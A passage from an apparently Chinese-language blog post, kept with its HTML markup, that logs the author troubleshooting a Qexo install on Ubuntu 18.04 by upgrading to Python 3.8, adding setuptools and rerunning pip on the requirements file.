1.17.97, 1.17.98, 1.17.99, 1.17.100, 1.17.101, 1.17.102, 1.17.103, 1.17.104, 1.17.105, 1.17.106, 1.17.107, 1.17.108, 1.17.109, 1.17.110, 1.17.111, 1.17.112, 1.18.0, 1.18.1, 1.18.2, 1.18.3, 1.18.4, 1.18.5, 1.18.6, 1.18.7, 1.18.8, 1.18.9, 1.18.10, 1.18.11, 1.18.12, 1.18.13, 1.18.14, 1.18.15, 1.18.16, 1.18.17, 1.18.18, 1.18.19, 1.18.20, 1.18.21, 1.18.22, 1.18.23, 1.18.24, 1.18.25, 1.18.26, 1.18.27, 1.18.28, 1.18.29, 1.18.30, 1.18.31, 1.18.32, 1.18.33, 1.18.34, 1.18.35, 1.18.36, 1.18.37, 1.18.38, 1.18.39, 1.18.40, 1.18.41, 1.18.42, 1.18.43, 1.18.44, 1.18.45, 1.18.46, 1.18.47, 1.18.48, 1.18.49, 1.18.50, 1.18.51, 1.18.52, 1.18.53, 1.18.54, 1.18.55, 1.18.56, 1.18.57, 1.18.58, 1.18.59, 1.18.60, 1.18.61, 1.18.62, 1.18.63, 1.18.64, 1.18.65, 1.19.0, 1.19.1, 1.19.2, 1.19.3, 1.19.4, 1.19.5, 1.19.6, 1.19.7, 1.19.8, 1.19.9, 1.19.10, 1.19.11, 1.19.12, 1.20.0, 1.20.1, 1.20.2, 1.20.3, 1.20.4, 1.20.5, 1.20.6, 1.20.7, 1.20.8, 1.20.9, 1.20.10, 1.20.11, 1.20.12, 1.20.13, 1.20.14, 1.20.15, 1.20.16, 1.20.17, 1.20.18, 1.20.19, 1.20.20, 1.20.21, 1.20.22, 1.20.23, 1.20.24, 1.20.25, 1.20.26, 1.20.27, 1.20.28, 1.20.29, 1.20.30, 1.20.31, 1.20.32, 1.20.33, 1.20.34, 1.20.35, 1.20.36, 1.20.37, 1.20.38, 1.20.39, 1.20.40, 1.20.41, 1.20.42, 1.20.43, 1.20.44, 1.20.45, 1.20.46, 1.20.47, 1.20.48, 1.20.49, 1.20.50, 1.20.51, 1.20.52, 1.20.53, 1.20.54, 1.21.0, 1.21.1, 1.21.2, 1.21.3, 1.21.4, 1.21.5, 1.21.6, 1.21.7, 1.21.8, 1.21.9, 1.21.10, 1.21.11, 1.21.12, 1.21.13, 1.21.14, 1.21.15, 1.21.16, 1.21.17, 1.21.18, 1.21.19, 1.21.20, 1.21.21, 1.21.22, 1.21.23, 1.21.24, 1.21.25, 1.21.26, 1.21.27, 1.21.28, 1.21.29, 1.21.30, 1.21.31, 1.21.32, 1.21.33, 1.21.34, 1.21.35, 1.21.36, 1.21.37, 1.21.38, 1.21.39, 1.21.40, 1.21.41, 1.21.42, 1.21.43, 1.21.44, 1.21.45, 1.21.46, 1.22.0, 1.22.1, 1.22.2, 1.22.3, 1.22.4, 1.22.5, 1.22.6, 1.22.7, 1.22.8, 1.22.9, 1.22.10, 1.22.11, 1.22.12, 1.22.13, 1.23.0, 1.23.1, 1.23.2, 1.23.3, 1.23.4, 1.23.5, 1.23.6, 1.23.7, 1.23.8, 1.23.9, 1.23.10)<br>ERROR: No matching distribution found <span class="hljs-keyword">for</span> boto3==1.34.44<br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br><br><br><br><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># pip install --upgrade pip</span><br>/usr/lib/python3/dist-packages/secretstorage/dhcrypto.py:15: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support <span class="hljs-keyword">for</span> it is deprecated <span class="hljs-keyword">in</span> cryptography. The next release of cryptography will remove support <span class="hljs-keyword">for</span> Python 3.6.<br>  from cryptography.utils import int_from_bytes<br>Requirement already satisfied: pip <span class="hljs-keyword">in</span> /usr/local/lib/python3.6/dist-packages (21.3.1)<br>WARNING: Running pip as the <span class="hljs-string">&#x27;root&#x27;</span> user can result <span class="hljs-keyword">in</span> broken permissions and conflicting behaviour with the system package manager. It is recommended to use a virtual environment instead: https://pip.pypa.io/warnings/venv<br><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># python -V</span><br>Python 3.6.9<br></code></pre></td></tr></table></figure><p>确认尝试安装的版本号（1.34.44）是否确实存在：存在<br>boto3 1.34.44：<a href="https://pypi.org/project/boto3/1.34.44/">boto3 · PyPI</a></p><h3 id="小插曲：尝试升级python版本"><a href="#小插曲：尝试升级python版本" class="headerlink" title="小插曲：尝试升级python版本"></a>小插曲：尝试升级python版本</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ~]<span class="hljs-comment"># sudo apt update</span><br>Ign:1 https://download.docker.com/linux/ubuntu bionic InRelease<br>Err:2 https://download.docker.com/linux/ubuntu bionic Release                                           <br>  Could not handshake: Error <span class="hljs-keyword">in</span> the pull <span class="hljs-keyword">function</span>. [IP: 18.155.68.15 443]<br>Hit:3 https://mirrors.aliyun.com/ubuntu bionic InRelease                                                <br>Get:4 https://mirrors.aliyun.com/ubuntu bionic-security InRelease [102 kB]                           <br>Get:5 https://mirrors.aliyun.com/ubuntu bionic-updates InRelease [102 kB]<br>Get:6 https://mirrors.aliyun.com/ubuntu bionic-backports InRelease [102 kB]        <br>Hit:7 http://ppa.launchpad.net/kubuntu-ppa/backports/ubuntu bionic InRelease       <br>Get:8 https://mirrors.aliyun.com/ubuntu bionic-security/main amd64 DEP-11 Metadata [76.8 kB]<br>Get:9 https://mirrors.aliyun.com/ubuntu bionic-security/restricted amd64 DEP-11 Metadata [212 B]<br>Get:10 https://mirrors.aliyun.com/ubuntu bionic-security/universe amd64 DEP-11 Metadata [61.9 kB]<br>Get:11 https://mirrors.aliyun.com/ubuntu bionic-security/multiverse amd64 DEP-11 Metadata [2,464 B]<br>Get:12 https://mirrors.aliyun.com/ubuntu bionic-updates/main amd64 DEP-11 Metadata [297 kB]<br>Get:13 https://mirrors.aliyun.com/ubuntu bionic-updates/restricted amd64 DEP-11 Metadata [212 B]<br>Get:14 https://mirrors.aliyun.com/ubuntu bionic-updates/universe amd64 DEP-11 Metadata [303 kB]<br>Get:15 https://mirrors.aliyun.com/ubuntu bionic-updates/multiverse amd64 DEP-11 Metadata [2,464 B]<br>Get:16 https://mirrors.aliyun.com/ubuntu bionic-backports/main amd64 DEP-11 Metadata [8,112 B]<br>Get:17 https://mirrors.aliyun.com/ubuntu bionic-backports/restricted amd64 DEP-11 Metadata [216 B]<br>Get:18 https://mirrors.aliyun.com/ubuntu bionic-backports/universe amd64 DEP-11 Metadata [10.1 kB]<br>Get:19 https://mirrors.aliyun.com/ubuntu bionic-backports/multiverse amd64 DEP-11 Metadata [216 B]<br>Reading package lists... Done              <br>E: The repository <span class="hljs-string">&#x27;https://download.docker.com/linux/ubuntu bionic Release&#x27;</span> no longer has a Release file.<br>N: Updating from such a repository can<span class="hljs-string">&#x27;t be done securely, and is therefore disabled by default.</span><br><span class="hljs-string">N: See apt-secure(8) manpage for repository creation and user configuration details.</span><br><span class="hljs-string">[root@ningan ~]# </span><br><span class="hljs-string">[root@ningan ~]# </span><br><span class="hljs-string">[root@ningan ~]# sudo apt install python3.8</span><br><span class="hljs-string">Reading package lists... Done</span><br><span class="hljs-string">Building dependency tree       </span><br><span class="hljs-string">Reading state information... Done</span><br><span class="hljs-string">The following additional packages will be installed:</span><br><span class="hljs-string">  libpython3.8-minimal libpython3.8-stdlib python3.8-minimal</span><br><span class="hljs-string">Suggested packages:</span><br><span class="hljs-string">  python3.8-venv python3.8-doc</span><br><span class="hljs-string">The following NEW packages will be installed:</span><br><span class="hljs-string">  libpython3.8-minimal libpython3.8-stdlib python3.8 python3.8-minimal</span><br><span class="hljs-string">0 upgraded, 4 newly installed, 0 to remove and 7 not upgraded.</span><br><span class="hljs-string">Need to get 4,542 kB of archives.</span><br><span class="hljs-string">After this operation, 18.4 MB of additional disk space will be used.</span><br><span class="hljs-string">Do you want to continue? [Y/n] y</span><br><span class="hljs-string">Get:1 https://mirrors.aliyun.com/ubuntu bionic-security/universe amd64 libpython3.8-minimal amd64 3.8.0-3ubuntu1~18.04.2 [704 kB]</span><br><span class="hljs-string">Get:2 https://mirrors.aliyun.com/ubuntu bionic-security/universe amd64 python3.8-minimal amd64 3.8.0-3ubuntu1~18.04.2 [1,807 kB]</span><br><span class="hljs-string">Get:3 https://mirrors.aliyun.com/ubuntu bionic-security/universe amd64 libpython3.8-stdlib amd64 3.8.0-3ubuntu1~18.04.2 [1,676 kB]</span><br><span class="hljs-string">Get:4 https://mirrors.aliyun.com/ubuntu bionic-security/universe amd64 python3.8 amd64 3.8.0-3ubuntu1~18.04.2 [355 kB]</span><br><span class="hljs-string">Fetched 4,542 kB in 1s (6,984 kB/s) </span><br><span class="hljs-string">Selecting previously unselected package libpython3.8-minimal:amd64.</span><br><span class="hljs-string">(Reading database ... 278125 files and directories currently installed.)</span><br><span class="hljs-string">Preparing to unpack .../libpython3.8-minimal_3.8.0-3ubuntu1~18.04.2_amd64.deb ...</span><br><span class="hljs-string">Unpacking libpython3.8-minimal:amd64 (3.8.0-3ubuntu1~18.04.2) ...</span><br><span class="hljs-string">Selecting previously unselected package python3.8-minimal.</span><br><span class="hljs-string">Preparing to unpack .../python3.8-minimal_3.8.0-3ubuntu1~18.04.2_amd64.deb ...</span><br><span class="hljs-string">Unpacking python3.8-minimal (3.8.0-3ubuntu1~18.04.2) ...</span><br><span class="hljs-string">Selecting previously unselected package libpython3.8-stdlib:amd64.</span><br><span class="hljs-string">Preparing to unpack .../libpython3.8-stdlib_3.8.0-3ubuntu1~18.04.2_amd64.deb ...</span><br><span class="hljs-string">Unpacking libpython3.8-stdlib:amd64 (3.8.0-3ubuntu1~18.04.2) ...</span><br><span class="hljs-string">Selecting previously unselected package python3.8.</span><br><span class="hljs-string">Preparing to unpack .../python3.8_3.8.0-3ubuntu1~18.04.2_amd64.deb ...</span><br><span class="hljs-string">Unpacking python3.8 (3.8.0-3ubuntu1~18.04.2) ...</span><br><span class="hljs-string">Setting up libpython3.8-minimal:amd64 (3.8.0-3ubuntu1~18.04.2) ...</span><br><span class="hljs-string">Setting up python3.8-minimal (3.8.0-3ubuntu1~18.04.2) ...</span><br><span class="hljs-string">Setting up libpython3.8-stdlib:amd64 (3.8.0-3ubuntu1~18.04.2) ...</span><br><span class="hljs-string">Setting up python3.8 (3.8.0-3ubuntu1~18.04.2) ...</span><br><span class="hljs-string">Processing triggers for gnome-menus (3.13.3-11ubuntu1.1) ...</span><br><span class="hljs-string">Processing triggers for mime-support (3.60ubuntu1) ...</span><br><span class="hljs-string">Processing triggers for desktop-file-utils (0.23-1ubuntu3.18.04.2) ...</span><br><span class="hljs-string">Processing triggers for man-db (2.8.3-2ubuntu0.1) ...</span><br><span class="hljs-string">[root@ningan ~]# </span><br><span class="hljs-string">[root@ningan ~]# </span><br><span class="hljs-string">[root@ningan ~]# python3.8 --version</span><br><span class="hljs-string">Python 3.8.0</span><br></code></pre></td></tr></table></figure><h3 id="回到主线"><a href="#回到主线" class="headerlink" title="回到主线"></a>回到主线</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan Qexo-3.4.1]<span class="hljs-comment"># python3.8 -m pip install -r requirements.txt</span><br>Collecting Django==3.2.25 (from -r requirements.txt (line 1))<br>  Cache entry deserialization failed, entry ignored<br>  Cache entry deserialization failed, entry ignored<br>  Downloading https://files.pythonhosted.org/packages/30/8e/cc23c762c5dcd1d367d73cf006a326e0df2bd0e785cba18b658b39904c1e/Django-3.2.25-py3-none-any.whl (7.9MB)<br>    100% |████████████████████████████████| 7.9MB 189kB/s <br>Collecting PyMySQL==1.0.2 (from -r requirements.txt (line 2))<br>  Cache entry deserialization failed, entry ignored<br>  Cache entry deserialization failed, entry ignored<br>  Downloading https://files.pythonhosted.org/packages/4f/52/a115fe175028b058df353c5a3d5290b71514a83f67078a6482cff24d6137/PyMySQL-1.0.2-py3-none-any.whl (43kB)<br>    100% |████████████████████████████████| 51kB 3.1MB/s <br>Collecting boto3==1.34.44 (from -r requirements.txt (line 3))<br>  Cache entry deserialization failed, entry ignored<br>  Downloading https://files.pythonhosted.org/packages/15/1e/cbec55e05c0577429945d785cce8e16eebf2a8bd9c5ccda2b9c6e2a51ab4/boto3-1.34.44-py3-none-any.whl (139kB)<br>    100% |████████████████████████████████| 143kB 2.5MB/s <br>Collecting requests==2.31.0 (from -r requirements.txt (line 4))<br>  Cache entry deserialization failed, entry ignored<br>  Cache entry deserialization failed, entry ignored<br>  Downloading https://files.pythonhosted.org/packages/70/8e/0e2d847013cb52cd35b38c009bb167a1a26b2ce6cd6965bf26b47bc0bf44/requests-2.31.0-py3-none-any.whl (62kB)<br>    100% |████████████████████████████████| 71kB 2.8MB/s <br>Collecting PyGithub==2.2.0 (from -r requirements.txt (line 5))<br>  Cache entry deserialization failed, entry ignored<br>  Downloading https://files.pythonhosted.org/packages/37/56/6e038f8cd6b76984005cd5cf90926caa6898b4220984a32dbbdc044a3f18/PyGithub-2.2.0-py3-none-any.whl (350kB)<br>    100% |████████████████████████████████| 358kB 2.0MB/s <br>Collecting python-gitlab==4.4.0 (from -r requirements.txt (line 6))<br>  Downloading https://files.pythonhosted.org/packages/70/f3/82ec52f96bbcccd10a6ce8f145115d08463c54a374f31beb278aa16d8b25/python_gitlab-4.4.0-py3-none-any.whl (138kB)<br>    100% |████████████████████████████████| 143kB 2.4MB/s <br>Collecting html2text==2020.1.16 (from -r requirements.txt (line 7))<br>  Downloading https://files.pythonhosted.org/packages/ae/88/14655f727f66b3e3199f4467bafcc88283e6c31b562686bf606264e09181/html2text-2020.1.16-py3-none-any.whl<br>Collecting PyYAML==6.0.1 (from -r requirements.txt (line 8))<br>  Downloading https://files.pythonhosted.org/packages/cd/e5/af35f7ea75cf72f2cd079c95ee16797de7cd71f29ea7c68ae5ce7be1eda0/PyYAML-6.0.1.tar.gz (125kB)<br>    100% |████████████████████████████████| 133kB 2.5MB/s <br>    Complete output from <span class="hljs-built_in">command</span> python setup.py egg_info:<br>    Traceback (most recent call last):<br>      File <span class="hljs-string">&quot;&lt;string&gt;&quot;</span>, line 1, <span class="hljs-keyword">in</span> &lt;module&gt;<br>    ModuleNotFoundError: No module named <span class="hljs-string">&#x27;setuptools&#x27;</span><br>    <br>    ----------------------------------------<br>Command <span class="hljs-string">&quot;python setup.py egg_info&quot;</span> failed with error code 1 <span class="hljs-keyword">in</span> /tmp/pip-build-7rwpufp2/PyYAML/<br></code></pre></td></tr></table></figure><h3 id="小插曲：检查setuptools装在哪里了"><a href="#小插曲：检查setuptools装在哪里了" class="headerlink" title="小插曲：检查setuptools装在哪里了"></a>小插曲：检查setuptools装在哪里了</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan Qexo-3.4.1]<span class="hljs-comment"># python -m pip show setuptools</span><br>Name: setuptools<br>Version: 59.6.0<br>Summary: Easily download, build, install, upgrade, and uninstall Python packages<br>Home-page: https://github.com/pypa/setuptools<br>Author: Python Packaging Authority<br>Author-email: distutils-sig@python.org<br>License: UNKNOWN<br>Location: /usr/local/lib/python3.6/dist-packages<br>Requires: <br>Required-by: launchpadlib, tensorboard<br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># python3 -m pip show setuptools</span><br>Name: setuptools<br>Version: 59.6.0<br>Summary: Easily download, build, install, upgrade, and uninstall Python packages<br>Home-page: https://github.com/pypa/setuptools<br>Author: Python Packaging Authority<br>Author-email: distutils-sig@python.org<br>License: UNKNOWN<br>Location: /usr/local/lib/python3.6/dist-packages<br>Requires: <br>Required-by: launchpadlib, tensorboard<br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># python3.8 -m pip show setuptools</span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># python3.8 -m pip install setuptools</span><br>Collecting setuptools<br>  Cache entry deserialization failed, entry ignored<br>  Downloading https://files.pythonhosted.org/packages/90/12/282ee9bce8b58130cb762fbc9beabd531549952cac11fc56add11dcb7ea0/setuptools-75.3.0-py3-none-any.whl (1.3MB)<br>    100% |████████████████████████████████| 1.3MB 898kB/s <br>Installing collected packages: setuptools<br>Successfully installed setuptools-75.3.0<br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># python3.8 -m pip show setuptools</span><br>Name: setuptools<br>Version: 75.3.0<br>Summary: Easily download, build, install, upgrade, and uninstall Python packages<br>Home-page: None<br>Author: None<br>Author-email: Python Packaging Authority &lt;distutils-sig@python.org&gt;<br>License: None<br>Location: /usr/local/lib/python3.8/dist-packages<br>Requires: <br></code></pre></td></tr></table></figure><h3 id="回到主线-1"><a href="#回到主线-1" class="headerlink" title="回到主线"></a>回到主线</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs awk">[root@ningan Qexo-<span class="hljs-number">3.4</span>.<span class="hljs-number">1</span>]<span class="hljs-comment"># python3.8 -m pip install -r requirements.txt</span><br>Collecting Django==<span class="hljs-number">3.2</span>.<span class="hljs-number">25</span> (from -r requirements.txt (line <span class="hljs-number">1</span>))<br>  Using cached https:<span class="hljs-regexp">//</span>files.pythonhosted.org<span class="hljs-regexp">/packages/</span><span class="hljs-number">30</span><span class="hljs-regexp">/8e/</span>cc23c762c5dcd1d367d73cf006a326e0df2bd0e785cba18b658b39904c1e/Django-<span class="hljs-number">3.2</span>.<span class="hljs-number">25</span>-py3-none-any.whl<br>Collecting PyMySQL==<span class="hljs-number">1.0</span>.<span class="hljs-number">2</span> (from -r requirements.txt (line <span class="hljs-number">2</span>))<br>  Using cached https:<span class="hljs-regexp">//</span>files.pythonhosted.org<span class="hljs-regexp">/packages/</span><span class="hljs-number">4</span>f<span class="hljs-regexp">/52/</span>a115fe175028b058df353c5a3d5290b71514a83f67078a6482cff24d6137/PyMySQL-<span class="hljs-number">1.0</span>.<span class="hljs-number">2</span>-py3-none-any.whl<br>Collecting boto3==<span class="hljs-number">1.34</span>.<span class="hljs-number">44</span> (from -r requirements.txt (line <span class="hljs-number">3</span>))<br>  Using cached https:<span class="hljs-regexp">//</span>files.pythonhosted.org<span class="hljs-regexp">/packages/</span><span class="hljs-number">15</span><span class="hljs-regexp">/1e/</span>cbec55e05c0577429945d785cce8e16eebf2a8bd9c5ccda2b9c6e2a51ab4/boto3-<span class="hljs-number">1.34</span>.<span class="hljs-number">44</span>-py3-none-any.whl<br>Collecting requests==<span class="hljs-number">2.31</span>.<span class="hljs-number">0</span> (from -r requirements.txt (line <span class="hljs-number">4</span>))<br>  Using cached https:<span class="hljs-regexp">//</span>files.pythonhosted.org<span class="hljs-regexp">/packages/</span><span class="hljs-number">70</span><span class="hljs-regexp">/8e/</span><span class="hljs-number">0</span>e2d847013cb52cd35b38c009bb167a1a26b2ce6cd6965bf26b47bc0bf44/requests-<span class="hljs-number">2.31</span>.<span class="hljs-number">0</span>-py3-none-any.whl<br>Collecting PyGithub==<span class="hljs-number">2.2</span>.<span class="hljs-number">0</span> (from -r requirements.txt (line <span class="hljs-number">5</span>))<br>  Using cached https:<span class="hljs-regexp">//</span>files.pythonhosted.org<span class="hljs-regexp">/packages/</span><span class="hljs-number">37</span><span class="hljs-regexp">/56/</span><span class="hljs-number">6</span>e038f8cd6b76984005cd5cf90926caa6898b4220984a32dbbdc044a3f18/PyGithub-<span class="hljs-number">2.2</span>.<span class="hljs-number">0</span>-py3-none-any.whl<br>Collecting python-gitlab==<span class="hljs-number">4.4</span>.<span class="hljs-number">0</span> (from -r requirements.txt (line <span class="hljs-number">6</span>))<br>  Using cached https:<span class="hljs-regexp">//</span>files.pythonhosted.org<span class="hljs-regexp">/packages/</span><span class="hljs-number">70</span><span class="hljs-regexp">/f3/</span><span class="hljs-number">82</span>ec52f96bbcccd10a6ce8f145115d08463c54a374f31beb278aa16d8b25/python_gitlab-<span class="hljs-number">4.4</span>.<span class="hljs-number">0</span>-py3-none-any.whl<br>Collecting html2text==<span class="hljs-number">2020.1</span>.<span class="hljs-number">16</span> (from -r requirements.txt (line <span class="hljs-number">7</span>))<br>  Using cached https:<span class="hljs-regexp">//</span>files.pythonhosted.org<span class="hljs-regexp">/packages/</span>ae<span class="hljs-regexp">/88/</span><span class="hljs-number">14655</span>f727f66b3e3199f4467bafcc88283e6c31b562686bf606264e09181/html2text-<span class="hljs-number">2020.1</span>.<span class="hljs-number">16</span>-py3-none-any.whl<br>Collecting PyYAML==<span class="hljs-number">6.0</span>.<span class="hljs-number">1</span> (from -r requirements.txt (line <span class="hljs-number">8</span>))<br>  Using cached https:<span class="hljs-regexp">//</span>files.pythonhosted.org<span class="hljs-regexp">/packages/</span>cd<span class="hljs-regexp">/e5/</span>af35f7ea75cf72f2cd079c95ee16797de7cd71f29ea7c68ae5ce7be1eda0/PyYAML-<span class="hljs-number">6.0</span>.<span class="hljs-number">1</span>.tar.gz<br>Collecting urllib3==<span class="hljs-number">1.26</span>.<span class="hljs-number">18</span> (from -r requirements.txt (line <span class="hljs-number">9</span>))<br>  Cache entry deserialization failed, entry ignored<br>  Downloading https:<span class="hljs-regexp">//</span>files.pythonhosted.org<span class="hljs-regexp">/packages/</span>b0<span class="hljs-regexp">/53/</span>aa91e163dcfd1e5b82d8a890ecf13314e3e149c05270cc644581f77f17fd/urllib3-<span class="hljs-number">1.26</span>.<span class="hljs-number">18</span>-py2.py3-none-any.whl (<span class="hljs-number">143</span>kB)<br>    <span class="hljs-number">100</span>% |████████████████████████████████| <span class="hljs-number">153</span>kB <span class="hljs-number">1.1</span>MB/s <br>Collecting Markdown==<span class="hljs-number">3.5</span>.<span class="hljs-number">2</span> (from -r requirements.txt (line <span class="hljs-number">10</span>))<br>  Cache entry deserialization failed, entry ignored<br>  Downloading https:<span class="hljs-regexp">//</span>files.pythonhosted.org<span class="hljs-regexp">/packages/</span><span class="hljs-number">42</span><span class="hljs-regexp">/f4/</span>f0031854de10a0bc7821ef9fca0b92ca0d7aa6fbfbf504c5473ba825e49c/Markdown-<span class="hljs-number">3.5</span>.<span class="hljs-number">2</span>-py3-none-any.whl (<span class="hljs-number">103</span>kB)<br>    <span class="hljs-number">100</span>% |████████████████████████████████| <span class="hljs-number">112</span>kB <span class="hljs-number">3.9</span>MB/s <br>Collecting djongo5==<span class="hljs-number">1.3</span>.<span class="hljs-number">9</span> (from -r requirements.txt (line <span class="hljs-number">11</span>))<br>  Downloading https:<span class="hljs-regexp">//</span>files.pythonhosted.org<span class="hljs-regexp">/packages/</span><span class="hljs-number">1</span>d<span class="hljs-regexp">/42/</span>f3aaa938638cdf5c17a766950029bdb0a370580255a58cf2fb27fe487c66/djongo5-<span class="hljs-number">1.3</span>.<span class="hljs-number">9</span>-py3-none-any.whl (<span class="hljs-number">51</span>kB)<br>    <span class="hljs-number">100</span>% |████████████████████████████████| <span class="hljs-number">51</span>kB <span class="hljs-number">4.0</span>MB/s <br>Collecting django-cors-headers==<span class="hljs-number">4.1</span>.<span class="hljs-number">0</span> (from -r requirements.txt (line <span class="hljs-number">12</span>))<br>  Downloading https:<span class="hljs-regexp">//</span>files.pythonhosted.org<span class="hljs-regexp">/packages/</span>a0<span class="hljs-regexp">/2c/</span><span class="hljs-number">7</span>df4f05a02b20b2c22ffc137b5a04f93214bbaf202fd2a29637ac694e0e4/django_cors_headers-<span class="hljs-number">4.1</span>.<span class="hljs-number">0</span>-py3-none-any.whl<br>Collecting pymongo==<span class="hljs-number">3.13</span>.<span class="hljs-number">0</span> (from -r requirements.txt (line <span class="hljs-number">13</span>))<br>  Downloading https:<span class="hljs-regexp">//</span>files.pythonhosted.org<span class="hljs-regexp">/packages/</span><span class="hljs-number">0</span>b<span class="hljs-regexp">/9c/</span>e1652def3cc841688402fcfa676eb14bd5551cb29c7e1b6f65488d89b30b/pymongo-<span class="hljs-number">3.13</span>.<span class="hljs-number">0</span>-cp38-cp38-manylinux1_x86_64.whl (<span class="hljs-number">524</span>kB)<br>    <span class="hljs-number">100</span>% |████████████████████████████████| <span class="hljs-number">532</span>kB <span class="hljs-number">1.3</span>MB/s <br>Collecting dnspython==<span class="hljs-number">2.2</span>.<span class="hljs-number">1</span> (from -r requirements.txt (line <span class="hljs-number">14</span>))<br>  Downloading https:<span class="hljs-regexp">//</span>files.pythonhosted.org<span class="hljs-regexp">/packages/</span><span class="hljs-number">9</span>b<span class="hljs-regexp">/ed/</span><span 